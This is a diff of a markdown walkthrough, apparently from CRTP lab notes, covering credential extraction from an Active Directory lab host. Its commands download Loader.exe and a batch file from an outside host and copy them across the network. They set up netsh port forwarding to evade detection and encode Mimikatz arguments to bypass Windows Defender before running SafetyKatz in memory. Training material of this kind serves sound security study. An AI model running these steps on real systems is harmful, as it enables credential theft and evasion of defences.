@@ -115,34 +115,41 @@ This information allows us to potentially exploit these sessions using technique
 ### **Abuse using winrs**
 To extract credentials from dcorp-mgmt, we will use SafetyKatz.exe. We need to avoid direct detection, so we'll transfer Loader.exe from dcorp-ci to dcorp-mgmt.
 
-1. Ensure WinRM Port is Open 
+- Ensure WinRM Port is Open 
+
 First, check if you can execute commands on dcorp-mgmt and confirm if the WinRM port is open:
 
+```bash
+winrs -r:dcorp-mgmt hostname;whoami
+```
 ![Result](/img/crtp/result7.png){: width="972" height="589" }
-_If successful, you should see output similar to_
 
-2. Download Loader.exe
+- Download Loader.exe
+
 Download Loader.exe to dcorp-ci:
 
 ```bash
 iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
 ```
 
-3. Copy Loader.exe to dcorp-mgmt
+- Copy Loader.exe to dcorp-mgmt
+
 Copy Loader.exe from dcorp-ci to dcorp-mgmt:
 
 ```bash
 echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 
-4. Set Up Port Forwarding
+- Set Up Port Forwarding
+
 Establish port forwarding on dcorp-mgmt to evade detection. Use $null for output redirection to prevent command execution issues:
 
 ```bash
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
 ```
 
-5. Generate Encoded Arguments
+- Generate Encoded Arguments
+
 To bypass Windows Defender on dcorp-mgmt, encode arguments passed to Loader. Run the below command on the student VM to generate encoded arguments for sekurlsa::ekeys (this step does not need to be run on the reverse shell):
 
 ```bash
@@ -151,7 +158,8 @@ ArgSplit.bat
 
 ![Result](/img/crtp/result8.png){: width="972" height="589" }
 
-6. Create Batch File
+- Create Batch File
+
 Create a batch file with the encoded arguments. Below are the contents of the batch file(Safety.bat):
 ```bash
 @echo off
@@ -181,14 +189,16 @@ Download the batch file on dcorp-ci:
 iwr http://172.16.100.x/Safety.bat -OutFile C:\Users\Public\Safety.bat
 ```
 
-7. Copy Safety.bat to dcorp-mgmt
+- Copy Safety.bat to dcorp-mgmt
+
 Copy the batch file from dcorp-ci to dcorp-mgmt:
 
 ```bash
 echo F | xcopy C:\Users\Public\Safety.bat \\dcorp-mgmt\C$\Users\Public\Safety.bat
 ```
 
-8. Execute Safety.bat
+- Execute Safety.bat
+
 Run the batch file on dcorp-mgmt that uses Loader.exe to download and execute SafetyKatz.exe in-memory on dcorp-mgmt:
 
 ```bash
